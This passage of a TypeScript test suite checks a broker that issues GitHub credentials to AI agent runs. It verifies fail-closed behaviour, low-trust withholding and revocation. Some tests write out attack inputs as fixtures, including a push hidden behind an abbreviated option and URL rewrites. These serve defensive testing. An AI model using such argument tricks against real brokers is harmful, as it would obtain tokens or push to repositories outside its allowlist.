        ? { signature: "-----BEGIN SSH SIGNATURE-----\nU1NIU0lH\n-----END SSH SIGNATURE-----\n", keyFingerprint: `SHA256:${"a".repeat(43)}` }
        : { identity: "user", credential: { token: null, login: "agent-owner", userId: "32437578" }, signingKey: `ssh-ed25519 ${"A".repeat(68)}` };
      const payload = Buffer.from("object 4b825dc642cb6eb9a060e54bf8d69288fbee4904\n\nx\n").toString("base64");
      try {
        await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["tag", "-s", "v1", "-m", "x"], remote: null });
        expect(await resolveGitHubCommitSignature(db, input, payload)).toMatchObject({ unavailable: expect.stringContaining("managed git") });
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("N4/N7 (round 2c): an unreadable git option or a rewrite never hands out the run's token", async () => {
      const input = await seed();
      await grant(input, "A");
      const remote = "https://github.com/vllnt/paperclip.git";
      // Without a policy: a URL rewrite refuses the command.
      expect(await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["fetch", "origin"], remote, urlRewrites: true }))
        .toMatchObject({ status: "unavailable", failClosed: true, env: {} });
      // Under the run's own identity with an allowlist: an abbreviated option that hides the destination is refused.
      const plugin = await identityPlugin(input, { default: userWrites, allowedRepositories: ["vllnt/paperclip"] });
      try {
        const push = await resolveGitHubOperationCredentials(db, input, { program: "git", args: ["push", "--push-o", "x", "https://github.com/vllnt/other", "HEAD:refs/heads/main"], remote: null, currentBranch: "feat", touchesWorkflows: false });
        expect(push).toMatchObject({ status: "unavailable", failClosed: true, env: {} });
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    // Security review round 3: each test is an attack 45f8d6287 let through.
    it("M1 (round 3): an App write token minted while the company switched to its App user is never handed out", async () => {
      const input = await seed();
      await grant(input, "A");
      const plugin = await identityPlugin(input, { default: { commit: "bot", push: "bot", pullRequest: "bot", comment: "bot" } });
      const push = { program: "git" as const, args: ["push", "origin", "HEAD"], remote: "https://github.com/Anthm-FR/songtrivia.git", currentBranch: "feat", touchesWorkflows: false };
      try {
        // The plugin mints under the old (run) policy; an administrator switches the company to its App user meanwhile.
        plugin.answer = async () => {
          await db.update(pluginState).set({ valueJson: anthmPolicy }).where(eq(pluginState.pluginId, plugin.pluginId));
          return { identity: "bot", credential: { token: "ghs_app_write", login: "anthm-agents[bot]", userId: "99" } };
        };
        const answered = await resolveGitHubOperationCredentials(db, input, push);
        expect(answered).toMatchObject({ status: "unavailable", failClosed: true, env: {}, reason: expect.stringContaining("changed while this command was checked") });
        expect(JSON.stringify(answered)).not.toContain("ghs_app_write");
        // Under the run policy the same answer is handed out.
        await db.update(pluginState).set({ valueJson: { default: { commit: "bot", push: "bot", pullRequest: "bot", comment: "bot" } } }).where(eq(pluginState.pluginId, plugin.pluginId));
        plugin.answer = () => ({ identity: "bot", credential: { token: "ghs_app_write", login: "anthm-agents[bot]", userId: "99" } });
        expect(await resolveGitHubOperationCredentials(db, input, push)).toMatchObject({ status: "available", env: { GH_TOKEN: "ghs_app_write" } });
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("B2 (round 3): gh's saved default repository is checked, and the launcher is told which repository was", async () => {
      const input = await seed();
      const plugin = await identityPlugin(input, anthmPolicy);
      const user = { login: "agent-owner", userId: "32437578" };
      plugin.answer = (_key, params) => params.repository === "anthm-fr/songtrivia"
        ? { identity: "user", credential: { token: "ghu_user", ...user }, bodyFooter: false }
        : { identity: "user", unavailable: `${params.repository} is not in this company's GitHub write allowlist.` };
      const origin = "https://github.com/Anthm-FR/songtrivia.git";
      try {
        const saved = await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["issue", "comment", "1", "-b", "x"], remote: origin, ghResolved: ["Anthm-FR/linkzic"] } as never);
        expect(plugin.calls.at(-1)!.params).toMatchObject({ repository: "anthm-fr/linkzic" });
        expect(saved).toMatchObject({ status: "unavailable", failClosed: true, env: {} });
        const checked = await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["issue", "comment", "1", "-b", "x"], remote: origin });
        expect(checked).toMatchObject({ status: "available", repository: "anthm-fr/songtrivia", env: { GH_TOKEN: "ghu_user" } });
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("m5 (round 3): a native session's broker signs through the same signer as the server route", async () => {
      const input = await seed();
      const signed: Array<[string, string]> = [];
      const broker = await createNativeGitHubAccess({
        scope: input, target: null, cwd: process.cwd(), env: { PATH: process.env.PATH },
        resolveCredentials: async () => ({ status: "absent", env: {} }),
        resolveSignature: async (binding, payload) => { signed.push([binding.runId, payload]); return { signature: "-----BEGIN SSH SIGNATURE-----\nU1NIU0lH\n-----END SSH SIGNATURE-----\n" }; },
      });
      const sign = (body: unknown) => fetch(`${broker.env.PAPERCLIP_GITHUB_BROKER_URL}/runtime-tools/github/sign`, {
        method: "POST", headers: { authorization: `Bearer ${broker.env.PAPERCLIP_GITHUB_BRIDGE_TOKEN}`, "content-type": "application/json" }, body: JSON.stringify(body),
      });
      try {
        expect((await sign({ payload: "dHJlZQ==" })).status).toBe(403);
        broker.activate(input);
        const response = await sign({ payload: "dHJlZQ==" });
        expect(response.status).toBe(200);
        expect(await response.json()).toEqual({ signature: expect.stringMatching(/^-----BEGIN SSH SIGNATURE-----/) });
        expect(signed).toEqual([[input.runId, "dHJlZQ=="]]);
        expect((await sign({})).status).toBe(400);
      } finally { await broker.stop(); }
    });
    it("P4b (round 4): tells the GitHub plugin which commands merge or enable auto-merge", async () => {
      const input = await seed();
      const plugin = await identityPlugin(input, anthmPolicy);
      plugin.answer = () => ({ identity: "user", unavailable: "refused in this test" });
      const origin = "https://github.com/Anthm-FR/songtrivia.git", sha = "a".repeat(40);
      try {
        await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "merge", "7", "--squash", "--match-head-commit", sha], remote: origin });
        expect(plugin.calls.at(-1)!.params).toMatchObject({ action: "pullRequest", merge: true, pullRequest: 7, expectedHeadSha: sha });
        expect(plugin.calls.at(-1)!.params).not.toHaveProperty("autoMerge");
        await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "merge", "7", "--auto"], remote: origin });
        expect(plugin.calls.at(-1)!.params).toMatchObject({ merge: true, autoMerge: true });
        await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["api", "-X", "PUT", "repos/Anthm-FR/songtrivia/pulls/7/merge", "-f", `sha=${sha}`], remote: origin });
        expect(plugin.calls.at(-1)!.params).toMatchObject({ merge: true, pullRequest: 7, expectedHeadSha: sha });
        await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "comment", "7", "-b", "x"], remote: origin });
        expect(plugin.calls.at(-1)!.params).not.toHaveProperty("merge");
        // Round 5, m2: a base change reaches the plugin too.
        await resolveGitHubOperationCredentials(db, input, { program: "gh", args: ["pr", "edit", "7", "--base", "main"], remote: origin });
        expect(plugin.calls.at(-1)!.params).toMatchObject({ action: "pullRequest", retarget: true });
      } finally {
        registerGitHubWriteIdentityWorkers(null);
        await db.delete(plugins).where(eq(plugins.id, plugin.pluginId));
      }
    });
    it("returns no credential for unconnected users, removed membership, or ambiguous personal accounts", async () => {
      const input = await seed();
      await grant(input, "A");
      await switchTo(input, "B");
      expect((await resolveGitHubOperationCredentials(db, input)).env).toEqual(
        {},
      );
      await switchTo(input, "A");
      await db
        .update(companyMemberships)
        .set({ status: "inactive" })
        .where(eq(companyMemberships.companyId, input.companyId));
      expect((await resolveGitHubOperationCredentials(db, input)).status).toBe(
        "unavailable",
      );
      await db
        .update(companyMemberships)
        .set({ status: "active" })
        .where(eq(companyMemberships.companyId, input.companyId));
      const differentAccount = await grant(input, "A");
      await db
        .update(connectionGrants)
        .set({
          providerTenant: {
            github: {
              userId: "other-github-id",
              login: "A",
              installationCount: 1,
              repositoryCount: 1,
              repositorySelection: "selected",
              installationIds: ["1"],
              installationOwnerLogins: ["A"],
            },
          },
        })
        .where(eq(connectionGrants.id, differentAccount.id));
      expect(
        (await resolveGitHubOperationCredentials(db, input)).reason,
      ).toMatch(/More than one/);
      await expect(
        resolveGitHubOperationCredentials(db, {
          ...input,
          companyId: randomUUID(),
        }),
      ).rejects.toThrow();
    });
    it.each([true, false])(
      "prefers the healthy duplicate regardless of grant age (%s)",
      async (healthyNewer) => {
        const input = await seed();
        const healthy = await grant(input, "A");
        const broken = await grant(input, "A");
        await db
          .update(toolConnections)
          .set({ healthStatus: "ok" })
          .where(eq(toolConnections.id, healthy.connectionId));
        await db
          .update(toolConnections)
          .set({
            healthStatus: "error",
            healthMessage: "GitHub access changed during refresh. Try again.",
          })
          .where(eq(toolConnections.id, broken.connectionId));
        await db
          .update(connectionGrants)
          .set({
            createdAt: new Date(healthyNewer ? "2026-02-01" : "2026-01-01"),
          })
          .where(eq(connectionGrants.id, healthy.id));
        await db
          .update(connectionGrants)
          .set({
            createdAt: new Date(healthyNewer ? "2026-01-01" : "2026-02-01"),
          })
          .where(eq(connectionGrants.id, broken.id));
        expect(
          await resolveGitHubOperationCredentials(db, input),
        ).toMatchObject({
          status: "available",
          connectionId: healthy.connectionId,
          grantId: healthy.id,
          authenticationMode: "managed",
        });
      },
    );

    it("retries credential acquisition once using another grant for the same account", async () => {
      const input = await seed();
      const older = await grant(input, "A");
      const newer = await grant(input, "A");
      await db
        .update(connectionGrants)
        .set({ createdAt: new Date("2026-01-01") })
        .where(eq(connectionGrants.id, older.id));
      await db
        .update(connectionGrants)
        .set({ createdAt: new Date("2026-02-01") })
        .where(eq(connectionGrants.id, newer.id));
      vault.resolveUserSecretValue.mockRejectedValueOnce(
        new Error("secret provider failed"),
      );
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "available",
        grantId: older.id,
      });
    });

    it("uses one stable grant when the same person connects the same GitHub account twice", async () => {
      const input = await seed();
      const first = await grant(input, "A");
      const second = await grant(input, "A");
      await db
        .update(connectionGrants)
        .set({
          createdAt: new Date("2026-01-01"),
          updatedAt: new Date("2027-01-01"),
        })
        .where(eq(connectionGrants.id, first.id));
      await db
        .update(connectionGrants)
        .set({ createdAt: new Date("2026-02-01") })
        .where(eq(connectionGrants.id, second.id));
      const context = { ...input, responsibleUserId: "A" };
      expect(
        (
          await resolveManagedGitHubIdentitySelection(
            db,
            input.companyId,
            context,
          )
        ).grant?.id,
      ).toBe(second.id);
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "available",
        login: "A",
        source: "personal",
      });
      const connections = [first, second].map((row) => ({
        id: row.connectionId,
        config: { sourceTemplateKey: "github" },
      }));
      expect(
        await filterResolvedGitHubConnectionsForRun({
          db,
          ...context,
          connections,
        }),
      ).toEqual([connections[1]]);
      // A newer webhook on the old connection must not change the selected policy.
      await db
        .update(connectionGrants)
        .set({ updatedAt: new Date("2028-01-01") })
        .where(eq(connectionGrants.id, first.id));
      expect(
        (
          await resolveManagedGitHubIdentitySelection(
            db,
            input.companyId,
            context,
          )
        ).grant?.id,
      ).toBe(second.id);
      await db
        .update(connectionGrants)
        .set({ status: "revoked" })
        .where(eq(connectionGrants.id, second.id));
      expect(
        (
          await resolveManagedGitHubIdentitySelection(
            db,
            input.companyId,
            context,
          )
        ).grant?.id,
      ).toBe(first.id);
      await db
        .update(toolConnections)
        .set({ enabled: false })
        .where(eq(toolConnections.id, first.connectionId));
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "unavailable",
        env: {},
      });
    });
    it("does not conflate missing GitHub account IDs or another agent's connection audience", async () => {
      const input = await seed();
      const first = await grant(input, "A");
      const duplicate = await grant(input, "A");
      await db
        .update(connectionGrants)
        .set({ providerTenant: null })
        .where(eq(connectionGrants.id, duplicate.id));
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "unavailable",
        env: {},
      });
      await db
        .update(toolConnectionInstalls)
        .set({ targetId: randomUUID() })
        .where(eq(toolConnectionInstalls.connectionId, duplicate.connectionId));
      expect(
        (
          await resolveManagedGitHubIdentitySelection(db, input.companyId, {
            ...input,
            responsibleUserId: "A",
          })
        ).grant?.id,
      ).toBe(first.id);
      await switchTo(input, "B");
      expect((await resolveGitHubOperationCredentials(db, input)).env).toEqual(
        {},
      );
    });
    it.each([
      "missing-ref",
      "disabled-secret",
      "missing-secret",
      "wrong-owner",
      "disabled-definition",
      "no-repositories",
    ])(
      "ignores an incomplete newer duplicate when the same account has an eligible grant (%s)",
      async (problem) => {
        const input = await seed();
        const first = await grant(input, "A");
        const second = await grant(input, "A");
        await db
          .update(connectionGrants)
          .set({ createdAt: new Date("2026-01-01") })
          .where(eq(connectionGrants.id, first.id));
        await db
          .update(connectionGrants)
          .set({ createdAt: new Date("2026-02-01") })
          .where(eq(connectionGrants.id, second.id));
        if (problem === "missing-ref")
          await db
            .update(connectionGrants)
            .set({ credentialSecretRefs: [] })
            .where(eq(connectionGrants.id, second.id));
        if (problem === "disabled-secret")
          await db
            .update(companySecrets)
            .set({ status: "disabled" })
            .where(eq(companySecrets.id, second.secretId));
        if (problem === "disabled-definition")
          await db
            .update(userSecretDefinitions)
            .set({ status: "disabled" })
            .where(eq(userSecretDefinitions.id, second.definitionId));
        if (problem === "missing-secret")
          await db
            .delete(companySecrets)
            .where(eq(companySecrets.id, second.secretId));
        if (problem === "wrong-owner")
          await db
            .update(companySecrets)
            .set({ ownerUserId: "B" })
            .where(eq(companySecrets.id, second.secretId));
        if (problem === "no-repositories")
          await db
            .update(connectionGrants)
            .set({
              providerTenant: {
                github: {
                  userId: "A",
                  login: "A",
                  installationCount: 0,
                  repositoryCount: 0,
                  repositorySelection: "none",
                  installationIds: [],
                  installationOwnerLogins: [],
                },
              },
            })
            .where(eq(connectionGrants.id, second.id));
        expect(
          (
            await resolveManagedGitHubIdentitySelection(db, input.companyId, {
              ...input,
              responsibleUserId: "A",
            })
          ).grant?.id,
        ).toBe(first.id);
        expect(
          await resolveGitHubOperationCredentials(db, input),
        ).toMatchObject({ status: "available", login: "A" });
        const connections = [first, second].map((row) => ({
          id: row.connectionId,
          config: { sourceTemplateKey: "github" },
        }));
        expect(
          await filterResolvedGitHubConnectionsForRun({
            db,
            ...input,
            responsibleUserId: "A",
            connections,
          }),
        ).toEqual([connections[0]]);
      },
    );
    it("retains dedicated override semantics when the dedicated account has duplicate grants", async () => {
      const input = await seed();
      await grant(input, "A");
      const first = await grant(input, "robot", true);
      const second = await grant(input, "robot", true);
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "available",
        source: "dedicated",
        login: "robot",
      });
      await db
        .update(connectionGrants)
        .set({ status: "revoked" })
        .where(eq(connectionGrants.id, first.id));
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "available",
        source: "dedicated",
        login: "robot",
      });
      await db
        .update(connectionGrants)
        .set({ status: "revoked" })
        .where(eq(connectionGrants.id, second.id));
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "unavailable",
        source: "dedicated",
        env: {},
      });
    });
    it("honors dedicated overrides and never substitutes personal credentials when revoked or disabled", async () => {
      const input = await seed();
      await grant(input, "A");
      const dedicated = await grant(input, "robot", true);
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "available",
        source: "dedicated",
        login: "robot",
      });
      await db
        .update(connectionGrants)
        .set({ status: "revoked" })
        .where(eq(connectionGrants.id, dedicated.id));
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "unavailable",
        source: "dedicated",
        env: {},
      });
      await db
        .update(connectionGrants)
        .set({ status: "active" })
        .where(eq(connectionGrants.id, dedicated.id));
      await db
        .update(toolConnections)
        .set({ enabled: false })
        .where(eq(toolConnections.id, dedicated.connectionId));
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "unavailable",
        source: "dedicated",
        env: {},
      });
    });
    it("does not resolve the company default person's GitHub", async () => {
      const input = await seed();
      await grant(input, "A");
      await db
        .update(runIdentityContexts)
        .set({ cause: "company_default" })
        .where(eq(runIdentityContexts.runId, input.runId));
      expect((await resolveGitHubOperationCredentials(db, input)).env).toEqual(
        {},
      );
    });
    it.each([false, true])(
      "withholds sponsor and dedicated credentials from every low-trust policy source (dedicated=%s)",
      async (dedicated) => {
        for (const source of [
          "issue",
          "run",
          "agent",
          "project",
          "quarantined",
          "invalid",
          "missing_issue",
        ] as const) {
          const input = await seed();
          await grant(input, "A");
          if (dedicated) await grant(input, "robot", true);
          // Sponsor attribution is deliberately retained: it must not become a
          // credential grant just because the shared agent was dispatched for them.
          await db
            .update(issues)
            .set({
              originKind: "chat_channel",
              responsibleUserId: "A",
              createdByUserId: "A",
            })
            .where(eq(issues.id, input.issueId));
          const policy = {
            authorizationPolicy: {
              trustPreset: LOW_TRUST_REVIEW_PRESET,
              trustBoundary: {
                mode: LOW_TRUST_REVIEW_PRESET,
                companyId: input.companyId,
                rootIssueId: input.issueId,
                issueIds: [input.issueId],
                allowedAgentIds: [input.agentId],
                allowedToolClasses: ["git.read", "github.pr.read"],
              },
            },
          };
          if (source === "issue")
            await db
              .update(issues)
              .set({ executionPolicy: policy })
              .where(eq(issues.id, input.issueId));
          if (source === "run")
            await db
              .update(heartbeatRuns)
              .set({
                contextSnapshot: {
                  issueId: input.issueId,
                  executionPolicy: policy,
                },
              })
              .where(eq(heartbeatRuns.id, input.runId));
          if (source === "agent")
            await db
              .update(agents)
              .set({ permissions: policy })
              .where(eq(agents.id, input.agentId));
          if (source === "project") {
            const projectId = randomUUID();
            await db.insert(projects).values({
              id: projectId,
              companyId: input.companyId,
              name: "Restricted",
              executionWorkspacePolicy: policy,
            });
            await db
              .update(issues)
              .set({ projectId })
              .where(eq(issues.id, input.issueId));
          }
          if (source === "quarantined")
            await db
              .update(issues)
              .set({
                sourceTrust: {
                  preset: LOW_TRUST_REVIEW_PRESET,
                  disposition: "quarantined",
                  sourceIssueId: input.issueId,
                },
              })
              .where(eq(issues.id, input.issueId));
          if (source === "invalid")
            await db
              .update(heartbeatRuns)
              .set({
                contextSnapshot: {
                  issueId: input.issueId,
                  executionPolicy: {
                    authorizationPolicy: { trustPreset: "unknown" },
                  },
                },
              })
              .where(eq(heartbeatRuns.id, input.runId));
          if (source === "missing_issue")
            await db
              .update(heartbeatRuns)
              .set({ contextSnapshot: { issueId: randomUUID() } })
              .where(eq(heartbeatRuns.id, input.runId));
          vault.resolveSecretValue.mockClear();
          vault.resolveUserSecretValue.mockClear();
          expect(
            await resolveGitHubOperationCredentials(db, input),
            source,
          ).toMatchObject({
            status: "unavailable",
            env: {},
            reason: expect.stringContaining("low-trust"),
            // Attribution only names the acting agent and run; it never carries a credential.
            attribution: { agentName: "Shared", runId: input.runId },
          });
          expect(vault.resolveSecretValue, source).not.toHaveBeenCalled();
          expect(vault.resolveUserSecretValue, source).not.toHaveBeenCalled();
          const [history] = await db
            .select()
            .from(runIdentityContexts)
            .where(eq(runIdentityContexts.runId, input.runId));
          expect(history.github, source).toMatchObject({
            status: "unavailable",
          });
          expect(JSON.stringify(history), source).not.toContain("test-token-");
        }
      },
    );
    it("rechecks a taskless run's current project policy before exporting credentials", async () => {
      const input = await seed();
      await grant(input, "A");
      const projectId = randomUUID();
      await db.insert(projects).values({
        id: projectId,
        companyId: input.companyId,
        name: "Taskless project",
      });
      await db
        .update(heartbeatRuns)
        .set({ contextSnapshot: { projectId } })
        .where(eq(heartbeatRuns.id, input.runId));
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "available",
        login: "A",
      });
      await db
        .update(projects)
        .set({
          executionWorkspacePolicy: {
            authorizationPolicy: {
              trustPreset: LOW_TRUST_REVIEW_PRESET,
              trustBoundary: {
                mode: LOW_TRUST_REVIEW_PRESET,
                companyId: input.companyId,
                projectIds: [projectId],
                allowedAgentIds: [input.agentId],
              },
            },
          },
        })
        .where(eq(projects.id, projectId));
      vault.resolveSecretValue.mockClear();
      vault.resolveUserSecretValue.mockClear();
      expect(await resolveGitHubOperationCredentials(db, input)).toMatchObject({
        status: "unavailable",
        env: {},
      });
      expect(vault.resolveSecretValue).not.toHaveBeenCalled();
      expect(vault.resolveUserSecretValue).not.toHaveBeenCalled();
    });

    it("fails closed for missing or malformed bound task/project references", async () => {
      const input = await seed();
      await grant(input, "A");
      for (const contextSnapshot of [
        { projectId: randomUUID() },
        { projectId: "" },
        { projectId: false },
        { issueId: "" },
        { issueId: false },
      ]) {
        await db
          .update(heartbeatRuns)
          .set({ contextSnapshot })
          .where(eq(heartbeatRuns.id, input.runId));
        vault.resolveUserSecretValue.mockClear();
        if (Object.hasOwn(contextSnapshot, "issueId")) {
          await expect(
            resolveGitHubOperationCredentials(db, input),
          ).rejects.toMatchObject({
            status: 403,
            message: "Run task identity is invalid",
          });
        } else {
          expect(
            await resolveGitHubOperationCredentials(db, input),
          ).toMatchObject({ status: "unavailable", env: {} });
        }
        expect(vault.resolveUserSecretValue).not.toHaveBeenCalled();
      }
    });

    it("reuses a session broker across runs while rechecking live-run identity and revocation", async () => {
      const input = await seed();
      await grant(input, "A");
      await grant(input, "B");
      const broker = await createNativeGitHubAccess({
        scope: input, target: null, cwd: process.cwd(), env: { PATH: process.env.PATH },
        resolveCredentials: (binding) => resolveGitHubOperationCredentials(db, binding),
      });
      const post = () => fetch(`${broker.env.PAPERCLIP_GITHUB_BROKER_URL}/runtime-tools/github/credentials`, {
        method: "POST", headers: { authorization: `Bearer ${broker.env.PAPERCLIP_GITHUB_BRIDGE_TOKEN}` },
      });
      try {
        const releaseA = broker.activate(input);
        const a = await post();
        expect(a.status).toBe(200);
        expect((await a.json()).login).toBe("A");
        await db.update(heartbeatRuns).set({ status: "succeeded" }).where(eq(heartbeatRuns.id, input.runId));
        // Even a delayed controller release cannot authorize a finished DB run.
        expect((await post()).status).toBe(403);
        releaseA();
        const next = { ...input, runId: randomUUID() };
        await db.insert(heartbeatRuns).values({ id: next.runId, companyId: next.companyId, agentId: next.agentId, status: "running", contextSnapshot: { issueId: input.issueId } });
        await initializeRunIdentity(db, { companyId: input.companyId, runId: next.runId, responsibleUserId: "B", cause: "instruction" });
        broker.activate(next);
        const b = await post();
        expect(b.status).toBe(200);
        expect((await b.json()).login).toBe("B");
        await db.update(connectionGrants).set({ status: "revoked" }).where(eq(connectionGrants.companyId, input.companyId));
        const revoked = await post();
        expect((await revoked.json()).env).toEqual({});
      } finally { await broker.stop(); }
    });

    it("requires a run-scoped runtime capability and never accepts browser authentication or supplied identities", async () => {
      const input = await seed();
      await grant(input, "A");
      const app = express();
      app.use(express.json());
      app.use(runtimeConnectionIntentRoutes(db));
      app.use(errorHandler);
      const tokenInput = {
        ...input,
        responsibleUserId: "A",
        scope: "github_credentials" as const,
      };
      const token = createRuntimeToolsToken(tokenInput)!.token;
      const post = () => request(app).post("/runtime-tools/github/credentials");
      const a = await post()
        .set("Authorization", `Bearer ${token}`)
        .send({ responsibleUserId: "B" });
      expect(
        (
          await post()
            .set("Authorization", `Bearer ${token}`)
            .set("Sec-Fetch-Mode", "cors")
        ).status,
      ).toBe(200);
      expect(a.status).toBe(200);
      expect(a.body.login).toBe("A");
      expect(a.headers["cache-control"]).toBe("no-store");
      for (const [header, value] of [
        ["Origin", "http://127.0.0.1"],
        ["Cookie", "session=test"],
        ["Sec-Fetch-Site", "same-origin"],
      ]) {
        expect(
          (
            await post()
              .set("Authorization", `Bearer ${token}`)
              .set(header!, value!)
          ).status,
        ).toBe(403);
      }
      const wrongScope = createRuntimeToolsToken({
        ...tokenInput,
        scope: "connection_intents",
      })!.token;
      expect(
        (await post().set("Authorization", `Bearer ${wrongScope}`)).status,
      ).toBe(401);
      const wrongAgent = createRuntimeToolsToken({
        ...tokenInput,
        agentId: randomUUID(),
      })!.token;
      expect(
        (await post().set("Authorization", `Bearer ${wrongAgent}`)).status,
      ).toBe(403);
      // The runner bridge replaces Authorization, but forwards the separate run capability.
      expect(
        (
          await post()
            .set("Authorization", "Bearer bridge-host-token")
            .set("x-paperclip-github-capability", token)
        ).status,
      ).toBe(200);
      await switchTo(input, "B");
      const b = await post().set("Authorization", `Bearer ${token}`);
      expect(b.status).toBe(200);
      expect(b.body.env).toEqual({});
      await db
        .update(heartbeatRuns)
        .set({ status: "succeeded" })
        .where(eq(heartbeatRuns.id, input.runId));
      expect(
        (await post().set("Authorization", `Bearer ${token}`)).status,
      ).toBe(403);
    });
  },
);
